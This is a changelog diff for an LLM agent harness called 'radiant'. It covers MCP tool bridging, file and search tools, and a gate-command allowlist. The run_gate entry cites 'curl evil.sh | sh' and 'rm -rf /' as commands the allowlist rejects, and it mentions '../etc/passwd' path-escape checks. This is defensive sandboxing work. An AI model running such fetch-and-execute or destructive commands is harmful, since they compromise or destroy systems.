+| `--mode=light` on `loop start` | (removed — `loop` is always Full) |
+| `--mode=full` on `loop start` | (removed — `loop` is always Full) |
+| `RADIANT_MODE=light` env | (removed — use `radiant mcp serve`) |
+| `RADIANT_MODE=full` env | (removed — always Full on non-mcp subcommands) |
+| `mode: light` in `.radiant.yaml` | (removed — ignored if set) |
+| `mode: full` in `.radiant.yaml` | (removed — ignored if set) |
+
+---
+
+## [2.41.0] — 2026-06-29 — MCP Tool-Bridge Adapter (Sprint 72)
+
+The "any MCP server, any tool" release. Operators can now register
+external MCP servers as tool sources for the radiant harness. Tools
+from those servers appear in the local `tools.Registry` alongside
+the built-in four (`write_file`, `read_file`, `search_code`,
+`run_gate`), under `<bridge_name>__<tool_name>` namespaces.
+
+### Added — MCP stdio client (`internal/mcpbridge/client.go`)
+
+- New `internal/mcpbridge/` package — JSON-RPC 2.0 client over
+  stdio (the MCP spec's primary transport for local servers).
+- `Dial(ctx, name, command, args)` — spawns the server subprocess,
+  performs the `initialize` handshake + `notifications/initialized`
+  notification.
+- `ListTools(ctx)` — returns the tools advertised by the server.
+- `CallTool(ctx, name, args)` — invokes a tool, surfaces `isError`
+  results as structured errors.
+- `Close()` — graceful shutdown (SIGTERM, then SIGKILL after 2s).
+- `NewClientWithStdio(...)` — for tests and power users who want
+  to inject pre-wired streams.
+- Timeouts per RPC: `initialize` 10s, `tools/list` 30s, `tools/call`
+  60s. Cancellable via ctx.
+- Pending responses tracked via `sync.Map[int64]chan rpcResponse`,
+  matched by ID. Background reader goroutine drains stdout and
+  dispatches to waiters.
+- Protocol-level errors (`ErrTimeout`, `ErrServerCrash`,
+  `ErrProtocol`) surface as typed sentinels.
+
+### Added — Tool conversion (`internal/mcpbridge/registry.go`)
+
+- `MCPTool.ToLocalTool(client)` — converts an MCP `tools/list`
+  result into a `tools.Tool` bound to the client. Names are
+  namespaced: `<bridge>__<tool>` (e.g. `github__create_issue`).
+- `flattenSchema(schema)` — flattens MCP's JSON Schema
+  `inputSchema` into `tools.Param` slice (type, description,
+  required propagated). Complex nested schemas pass through as
+  opaque `object` params.
+
+### Added — Bridge helper (`internal/mcpbridge/bridge.go`)
+
+- `LoadTools(ctx, name, command, args)` — convenience that dials
+  + lists + converts in one call. Returns `(client, tools, err)`.
+- `ParseSpec(spec)` — parses CLI flag values like
+  `github:npx -y @modelcontextprotocol/server-github` into
+  `(name, command, args)`.
+
+### Added — Mock MCP server (`internal/mcpbridge/mock/main.go`)
+
+- Minimal in-tree mock for tests. Reads JSON-RPC from stdin,
+  handles `initialize` / `tools/list` / `tools/call`. Tool list
+  configurable via `MOCK_TOOLS` env var; the `fail_tool` name
+  triggers `isError=true` for error-path tests.
+
+### Changed — RealRegistry signature
+
+- `loop.RealRegistry(projectDir, mcpBridges...)` now accepts
+  optional `MCPSpec` slices. Returns `(*Registry, error)`. Built-in
+  tools never fail to register; an error means an MCP bridge
+  failed to dial.
+- `loop.RealRegistrySimple(projectDir)` is the convenience wrapper
+  for callers that don't need MCP integration.
+
+### Added — CLI flag `radiant run --mcp-bridge`
+
+- Repeatable: `--mcp-bridge "github:npx -y ..."` can appear
+  multiple times to register multiple bridges.
+- Spec format: `"name:command args..."`. Parser handles quoted
+  arguments.
+- Failures surface as CLI errors with the bridge name and the
+  underlying error.
+
+### Documentation
+
+- `docs/SPRINT72-PLAN.md` — the implementation plan this release
+  executed.
+- `docs/TOOL-USE.md` — MCP bridge section (CLI usage, semantics,
+  failure modes).
+- README updated with MCP bridge example.
+
+### Stats
+
+- 1 new package: `internal/mcpbridge/` (350 LOC client + 100 LOC
+  registry + 60 LOC bridge + 280 LOC tests).
+- 1 new mock: `internal/mcpbridge/mock/main.go` (120 LOC).
+- **989 tests passing across 29 packages, 0 confirmed failures**
+  (1 pre-existing flaky: `TestRunAllContextCanceled` in
+  `internal/fleet/`, documented in `validation-report-sprint-56-57.md`).
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+
+### Compatibility
+
+- No breaking changes. Built-in tools keep working unchanged.
+- New `loop.RealRegistry` signature change is internal — callers
+  via `tools.RealRegistry()` (the indirection) are unaffected.
+- `--mcp-bridge` is opt-in. Default behaviour unchanged.
+
+---
+
+## [2.40.0] — 2026-06-29 — Tool Use Wire-up Parte 3: run_gate concrete (Sprint 71)
+
+The "close the trio" release. `run_gate` is now a concrete tool
+that wraps `internal/gaterun.RunShellGate` with the
+`internal/policy.GateBinaries` allowlist. The RealRegistry ships
+**4 concrete tools** (write_file, read_file, search_code, run_gate);
+`tools.Default()` still advertises all 4 as stubs for back-compat
+inspection of the v2.37.0 surface area.
+
+### Added — `run_gate` tool (`internal/tools/gate/run_gate.go`)
+
+- New `internal/tools/gate/` package — first concrete tool outside
+  the `fs/` family.
+- `RunGateTool(projectDir)` returns a `*tools.Tool` that runs a
+  quality gate command and returns `{command, exit_code,
+  duration_ms, output, output_bytes, truncated}`.
+- Allowlist enforcement via `policy.ValidateGateCommand` — closed
+  set of binaries (go, make, npm, pytest, etc.) + no dangerous
+  operators (`;`, `|`, `<`, `>`, single `&`). `curl evil.sh | sh`
+  and `rm -rf /` rejected **before** any subprocess starts.
+- Wraps `gaterun.RunShellGate` for actual subprocess execution
+  (same code path the engine's `runGate` uses).
+- 5-minute timeout via `gaterun.Timeout`, ctx cancellation
+  propagates.
+- Output capped at 10 MiB (default) or per-call `max_output`. When
+  the cap is hit, output is truncated and a marker line is appended.
+- `RunGateResult.Annotate()` surfaces `{command, exit_code,
+  duration_ms, output_bytes, truncated}` to the verifier trace.
+  `Output` is excluded from `Annotate` to keep trace metadata
+  small — the full output is still available to the LLM via the
+  result JSON.
+- 11 unit tests: happy path, failing command (exit code
+  extraction via `errors.As`), disallowed binary rejection
+  (curl/rm/wget/chmod), empty command rejection, malformed JSON,
+  working directory verification, max-output truncation (with
+  pipe-buffer deadlock avoidance), Annotate, registry roundtrip,
+  duration tracking, cancellation honouring.
+
+### Changed — `RealRegistry` (`internal/loop/real_registry.go`)
+
+- Now registers 4 tools: `write_file`, `read_file`, `search_code`,
+  `run_gate`.
+
+### Documentation
+
+- `docs/SPRINT71-PLAN.md` — the implementation plan this release
+  executed.
+- `docs/validation-report-sprint-70.md` — validation of the
+  previous release (v2.39.0).
+- `docs/TOOL-USE.md` — updated with `run_gate` section
+  (params, behaviour, error surface, Annotate contract).
+
+### Stats
+
+- 1 new concrete tool: `run_gate`.
+- **~995 tests passing across 29 packages, 0 confirmed failures**
+  (validated with `go test -count=1 -v ./...`). `go vet ./...`
+  clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+- 4 files added (1 source + 1 tests + 2 docs), 2 modified
+  (`real_registry.go`, `main.go`). ~830 LOC total.
+
+### Compatibility
+
+- No breaking changes. `run_gate` is opt-in via the existing
+  `Engine.ToolRegistry` wiring.
+- LLM outputs that contain only `write_file`/`read_file`/`search_code`
+  keep working unchanged.
+- `tools.Default()` still advertises all 4 tools (with stubs for
+  the ones that are now concrete) — back-compat preserved.
+
+---
+
+## [2.39.0] — 2026-06-29 — Tool Use Wire-up Parte 2 (Sprint 70)
+
+The "read before you write" release. Two new concrete tools —
+`read_file` and `search_code` — close the read half of the
+read-write pair and add the first search primitive. The LLM can
+now inspect state before mutating it and grep the project tree
+without round-tripping through the shell.
+
+### Added — `read_file` tool (`internal/tools/fs/read_file.go`)
+
+- `ReadFileTool(projectDir)` returns a `*tools.Tool` that reads a
+  project-relative file and returns `{path, content, bytes, lines}`.
+- Boundary check via `fsutil.PathIsSafe` (symlink-aware, same as
+  `write_file`).
+- 4 MiB size cap (`MaxReadBytes`) — symmetric with `MaxWriteBytes`
+  so the LLM can read back what it just wrote.
+- `os.Stat` first to give a clear "file not found" or "is a
+  directory" error instead of `os.ReadFile`'s generic failure.
+- `ReadResult.Annotate()` satisfies the engine's duck-typed
+  `annotator` interface — verifier sees `path`/`bytes`/`lines`
+  without re-parsing content.
+- 12 unit tests: happy path, no-trailing-newline line counting,
+  empty file, missing file, directory rejection, unsafe paths,
+  symlink escape, oversize file, empty/whitespace path,
+  malformed JSON, Annotate, registry roundtrip.
+
+### Added — `search_code` tool (`internal/tools/fs/search_code.go`)
+
+- `SearchCodeTool(projectDir)` returns a `*tools.Tool` that does
+  regex search via `filepath.WalkDir` over a configurable search
+  root (defaults to project root).
+- Compile pattern first — bad regex surfaces as a structured
+  error before any disk I/O.
+- Skips hidden directories: `.git`, `.radiant-harness`,
+  `node_modules`, `vendor`, `.idea`, `.vscode`.
+- Skips binary files via `http.DetectContentType` on first 512
+  bytes — whitelist of `text/*`, `application/json`, `application/xml`,
+  `application/x-sh`, `application/javascript`.
+- Results capped at `DefaultSearchMaxResults = 1000`. `Truncated=true`
+  set when the cap is hit so the LLM knows to narrow the search.
+- `Include` glob filter (e.g. `*.go`) for narrowing without paying
+  the cost of irrelevant files.
+- 1 MiB per-line buffer cap in `bufio.Scanner` — blocks pathological
+  inputs (a single 100 MB line).
+- `SearchResult.Annotate()` surfaces `pattern`/`root`/`match_count`/
+  `truncated` to the verifier trace.
+- 11 unit tests: finds matches, multiple matches per line, no
+  matches, invalid regex, empty pattern, scope, include glob,
+  unsafe scope, max results cap, Annotate, registry roundtrip.
+
+### Added — Helpers (`internal/tools/fs/helper.go`)
+
+- `absProjectDir(projectDir)` — absolute, symlink-resolved path
+  of the project root. Shared by `read_file` and `search_code`.
+- `joinPath(absProject, candidate)` — joins the absolute root with
+  a project-relative candidate.
+
+### Changed — `RealRegistry` (`internal/loop/real_registry.go`)
+
+- Now registers 3 tools: `write_file`, `read_file`, `search_code`.
+- `run_gate` remains a stub (Sprint 71).
+
+### Documentation
+
+- `docs/SPRINT70-PLAN.md` — the implementation plan this release
+  executed.
+- `docs/TOOL-USE.md` — updated with `read_file` and `search_code`
+  sections (params, behaviour, examples).
+
+### Stats
+
+- 2 new concrete tools: `read_file`, `search_code`.
+- **969 tests passing across 28 packages, 0 failures** (validated
+  with `go test -count=1 -v ./...`). `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+- 5 files added (2 source + 2 tests + 1 plan doc), 1 modified
+  (`real_registry.go`). ~600 LOC total.
+
+### Compatibility
+
+- No breaking changes. New tools are opt-in via the existing
+  `Engine.ToolRegistry` wiring.
+- LLM outputs that contain only `write_file` tool calls keep
+  working unchanged.
+- LLM can now emit `read_file` and `search_code` in addition to
+  or instead of `write_file`.
+
+---
+
+## [2.38.0] — 2026-06-29 — Tool Use Wire-up Parte 1 (Sprint 69)
+
+The "stop regex-parsing code blocks" release. The first concrete
+structured tool — `write_file` — replaces the legacy
+`os.WriteFile`-based code-block emission for any LLM output that
+includes structured tool calls. The verifier prompt now surfaces
+the tool-call trace so it can audit each invocation, not guess from
+prose.
+
+### Added — Concrete `write_file` tool (`internal/tools/fs/`)
+
+- New `internal/tools/fs/` package (139 LOC) — the first concrete
+  tool in the registry.
+- `WriteFileTool(projectDir)` returns a `*tools.Tool` bound to the
+  given project dir. Atomic write via temp + fsync + rename (same
+  pattern as `cycle.go:persistLocked`).
+- Boundary check via `internal/fsutil.PathIsSafe` — symlink-aware,
+  catches `../etc/passwd` and nested symlink escapes.
+- `MaxWriteBytes = 4 MiB` cap rejects runaway emissions.
+- `WriteResult.Annotate()` implements the duck-typed `annotator`
+  interface so the executor picks up byte/path/created metadata
+  without taking a direct dependency on this package.
+- 11 unit tests: happy path, parent dir creation, overwrite,
+  unsafe path rejection (relative + symlink), empty/whitespace
+  path rejection, malformed JSON, oversize content, atomicity
+  invariant, schema validation, registry roundtrip.
+
+### Added — `internal/fsutil/` package
+
+- New neutral package hosts `PathIsSafe` so both `internal/engine`
+  (legacy code-block path) and `internal/tools/fs` (write_file)
+  can depend on it without an import cycle.
+- 3 unit tests including the nested symlinked project root case.
+
+### Added — Engine tool-call dispatch (`internal/engine/engine.go`)
+
+- `applyLLMResponse` now switches on tool-call presence:
+  - If `ToolRegistry != nil` and the response contains
+    ```tool_call``` fences → `applyToolCalls`.
+  - Otherwise → legacy `applyCodeBlocks` path (v2.37.0 behaviour).
+  - Mixed responses: tool calls win, code blocks silently ignored.
+- `extractToolCalls` parses ```tool_call``` fenced blocks
+  (symmetric with `extractCodeBlocks`).
+- `ToolCall` and `ToolCallRecord` types — exposed for the verifier
+  prompt builder.
+- `LastToolTrace()` returns the trace from the most recent
+  `applyLLMResponse` call.
+- `annotator` interface declared locally (duck-typed) so the engine
+  doesn't import any concrete tool package — breaks the cycle.
+- `PathIsSafe` and `pathIsSafe` retained as thin re-exports of
+  `fsutil.PathIsSafe` for backwards-compat with any caller that
+  depended on `engine.PathIsSafe`.
+
+### Added — Verifier prompt trace (`internal/loop/verifier.go`)
+
+- `BuildVerifierPrompt` accepts a new `toolTrace []ToolCallRecord`
+  parameter. When non-empty, the prompt gains a
+  `TOOL CALLS OBSERVED` section listing each call with name,
+  written path, byte count, and error (if any).
+- Two anti-cheat clauses added to the verifier prompt when the
+  trace is non-empty: "no tool call wrote outside the project
+  boundary" and "a tool call erroring is NOT grounds for rejection
+  if the executor correctly surfaced the error and adjusted".
+- Empty trace → prompt is byte-identical to v2.37.0 (back-compat).
+- 4 new tests in `loop_test.go` covering trace presence, absence,
+  and error surfacing.
+
+### Added — `RealRegistry` builder (`internal/loop/real_registry.go`)
+
+- `RealRegistry(projectDir)` returns a `*tools.Registry` with the
+  concrete tools available in the current release.
+- Lives in `internal/loop` (not `internal/tools`) to break an
+  import cycle: `tools/fs` → `tools` (for Tool/Param types), and
+  `tools` → `tools/fs` (for the builder).
+- `tools.SetRealRegistryBuilder` indirection + `init()` wires it
+  automatically — callers can `tools.RealRegistry(projectDir)`
+  without depending on `internal/loop` directly.
+- 1 test: `TestReal_IncludesConcreteWriteFile` (placeholder for
+  Sprint 70 expansion).
+
+### Added — CLI: `radiant tools` (`cmd/radiant/cmd_tools.go`)
+
+- `radiant tools list` — table view of the default registry
+  (v2.37.0 back-compat surface).
+- `radiant tools list --real` — table view of the concrete registry
+  (v2.38.0 wired tools).
+- `radiant tools list --json` — machine-readable JSON for
+  CI / dashboards.
+- `radiant run --no-tools` — disable structured tool-use; force
+  the legacy code-block emission path (full v2.37.0 back-compat).
+
+### Documentation
+
+- `docs/TOOL-USE.md` — operator guide (wire format, dispatcher,
+  behaviour matrix, tool authoring instructions).
+- `docs/SPRINT69-PLAN.md` — the implementation plan this release
+  executed.
+- README.md updated with Tool Use section (lightweight pointer
+  to TOOL-USE.md).
+
+### Stats
+
+- 1 new package: `internal/tools/fs/` (139 LOC + 213 LOC tests).
+- 1 new package: `internal/fsutil/` (74 LOC + 89 LOC tests).
+- 1 new package: `internal/loop/real_registry.go` (43 LOC).
+- 1 new CLI subcommand: `radiant tools list` (+`--real`, `--json`).
+- 1 new flag: `--no-tools` on `radiant run`.
+- **947 tests passing across 28 packages, 0 failures** (validated
+  with `go test -count=1 -v ./...`). `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+
+### Compatibility
+
+- No breaking changes. Default behaviour is to wire `RealRegistry`
+  into `Engine.ToolRegistry` automatically. Pass `--no-tools` to
+  restore v2.37.0 behaviour exactly.
+- LLM outputs that contain only code blocks keep working unchanged.
+- Mixed outputs (tool calls + code blocks) produce deterministic
+  outcomes: tool calls win.
+- `engine.PathIsSafe` retained as a thin wrapper for any caller
+  that imported it directly.
+
+---
+
+## [2.37.0] — 2026-06-29 — Light/Full modes, Semantic Model, Lazy-Executor
+
+The "make it closed" release. Three things the harness was missing are
+now first-class: the two-mode abstraction (Light/Full), the semantic
+model (credit-risk with CMN 4.966 / IFRS 9 / Basileia), and the
+lazy-executor skill (ported from the ponytail ladder).
+
+### Added — Mode abstraction (`internal/mode/`)
+- New `internal/mode/` package with `Mode` enum (`light`, `full`, `auto`).
+- `Resolve(flag, projectDir, configMode)` — full resolution chain:
+  `--mode` flag > `RADIANT_MODE` env > `.radiant.yaml` > auto-detect.
+- `Detect(projectDir)` — auto-detects via MCP config presence
+  (`~/.claude/settings.json`, `.cursor/mcp.json`, etc.) or LLM API key
+  in env.
+- 11 unit tests covering all paths.
+
+### Added — CLI: `radiant mode` (`cmd/radiant/cmd_mode.go`)
+- `radiant mode show` — display resolved mode and where it came from.
+- `radiant mode set light|full` — persist default in `.radiant.yaml`.
+- `--mode=light|full|auto` flag on `radiant loop start` and `radiant fleet start`.
+- `radiant doctor` now reports the active mode and validates key requirements.
+
+### Added — Pricing catalog (`internal/pricing/`)
+- New `internal/pricing/` package consolidates the three duplicated
+  model-rate tables (`PresetModels`, `PricePerMTokensUSD`,
+  `providerPricing`) into a single YAML source of truth.
+- `data/pricing.yaml` — embedded via `//go:embed`. 25 curated presets
+  across 12 vendors, with input/output rates, max tokens, and
+  `verified_at` date.
+- `Catalog.Get/List/Stale/EstimateCost` — thread-safe accessor.
+- 9 unit tests covering known presets, case-insensitive lookup,
+  cost estimation, sort order, staleness, source tracking.
+- `radiant pricing list|stale|refresh` CLI commands.
+
+### Added — Semantic model (`internal/semantic/`)
+- New `internal/semantic/` package — the "what it means here" layer
+  that fixes the drift problem described in the
+  Ontology-vs-Semantic-Model post.
+- `Model`, `Metric`, `Scope`, `Expression` types; normalize, Resolve,
+  Search, RenderMarkdown, RenderMarkdownCompact methods.
+- `Loader` with `//go:embed all:metrics` — same pattern as
+  `internal/skill/bundle.go`. User-level overrides via
+  `<root>/metrics/<domain>.yaml` when desired.
+- `normalizeWithCase` splits camelCase so `ExpectedLoss` →
+  `expected_loss`.
+- 11 unit tests covering normalize, Resolve, Search, RenderMarkdown,
+  loader caching.
+
+### Added — Domain: credit-risk (`internal/semantic/metrics/credit-risk.yaml`)
+- 7 metrics: `PD`, `LGD`, `EAD`, `RWA`, `ExpectedLoss`,
+  `provision_min_ifrs9`, `capital_required`.
+- Each carries description, formula (with cross-references via
+  `{metric_name}` and `{scope.field}` syntax), scopes (segment × rating),
+  and regulation reference (CMN 4.966 §X.X, IFRS 9 §X.X, Basileia).
+- This is the layer Fortvna needs for IFRS 9 / Basileia / CMN 4.966
+  work — the LLM resolves "RWA for Corporate" against curated math
+  instead of inventing a number.
+
+### Added — CLI: `radiant semantic` (`cmd/radiant/cmd_semantic.go`)
+- `radiant semantic list` — show all available domains.
+- `radiant semantic show <domain>` — full markdown of one domain.
+- `radiant semantic resolve <domain> <metric>` — formula + regulation.
+- `radiant semantic search <domain> <query>` — fuzzy search.
+
+### Added — Loop runner integration (`internal/loop/runner.go`)
+- `assembleSemanticBlock(projectDir)` — detects the project domain
+  and loads the matching semantic model; fails open if no YAML exists.
+- `executorSystemPromptWithIntensity()` now takes a `semanticBlock` and
+  injects it between the lazy-executor skill and the project context.
+- Result: in projects detected as `credit-risk`, every executor
+  iteration gets the full PD/LGD/EAD/RWA formulas with regulation
+  references automatically — no prompt engineering required.
+
+### Added — Lazy-executor skill (`internal/skill/skills/lazy-executor/`)
+- New skill porting the [ponytail ladder](https://github.com/DietrichGebert/ponytail)
+  in PT-BR, adapted to the radiant context where the verifier
+  already cuts code that doesn't satisfy ACs.
+- `SKILL.md` covers the 7-rung ladder, decision tree, workflow,
+  examples, anti-patterns, failure modes, related skills — all required
+  by schema rule 10.
+- `frontmatter.yaml` schema-compliant (tier_eligible, version, license).
+- Embedded via existing `bundle.go` `//go:embed` machinery.
+
+### Added — Intensity filter (`internal/skill/intensity.go`)
+- 4 levels: `lite`, `full` (default), `ultra`, `off`.
+- `FilterForIntensity()` strips table rows and bullet examples whose
+  label doesn't match the active intensity — mirrors ponytail's
+  `filterSkillBodyForMode`.
+- Preserves all non-labeled prose (rules, workflow, anti-patterns).
+- 10 unit tests covering all intensity paths.
+
+### Added — CLI: `--intensity` flag (`cmd/radiant/cmd_loop.go`)
+- `--intensity=lite|full|ultra|off` on `radiant loop start`.
+- Default: `full` (skill always injected unless explicitly off).
+
+### Security — `pathIsSafe` symlink fix (`internal/engine/engine.go`)
+- Original implementation did only lexical comparison — paths like
+  `evil/target.txt` passed the check even when `evil` was a symlink
+  pointing outside the project.
+- New strategy: resolve both sides to realpaths. For the candidate,
+  walk up to the longest existing prefix and resolve that — so a
+  proposed new file under a symlinked parent still gets caught.
+- `resolveLongestExistingPrefix()` walks up until something exists.
+- `fileExists()` helper for clarity.
+- 3 new tests: `TestPathIsSafe_SymlinkEscape`,
+  `TestPathIsSafe_SymlinkedProjectRoot`, plus existing
+  `TestPathIsSafe` still passes.
+
+### Documentation
+- `docs/MODES.md` — full operator guide: decision tree, architecture
+  diagrams per mode, resolution rules, pricing implications,
+  capability matrix, when-to-use-each guidance.
+- `docs/IMPLEMENTATION-PLAN.md` — roadmap for v2.37.0 (the plan
+  this release executed).
+- README updated with Choose-Your-Mode section, mode/pricing/semantic
+  command reference, lazy-executor skill mention, semantic-model
+  auto-injection explanation.
+- `.radiant-harness/` and `radiant` (root binary) added to `.gitignore`.
+
+### Stats
+- 9 commits on branch `feature/light-full-release` (8 features + 1 plan).
+- 5 new packages: `internal/mode/`, `internal/pricing/`, `internal/semantic/`,
+  `internal/tools/` (scaffold), plus extensions to `internal/skill/`,
+  `internal/engine/`, `internal/loop/`, `internal/cmd/`.
+- 4 new CLI subcommands: `mode`, `pricing`, `semantic`, plus `--intensity`
+  flag on `radiant loop start`.
+- 1 new skill: `lazy-executor` (PT-BR, port of the ponytail ladder).
+- 7 new metrics in `credit-risk.yaml` (PD, LGD, EAD, RWA, ExpectedLoss,
+  provision_min_ifrs9, capital_required) — references CMN 4.966 / IFRS 9 /
+  Basileia.
+- **921 tests passing across 26 packages, 0 failures** (validated with
+  `go test -count=1 -v ./...`). `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB), windows/amd64 (15 MB).
+- 37 files changed: +4,747 / −1,050 LOC.
+
+---
+
 ## [2.36.0] — 2026-06-28 — Dual-mode MCP backend: HTTP + MCP Sampling
 
 ### Added — `internal/llm/backend.go`
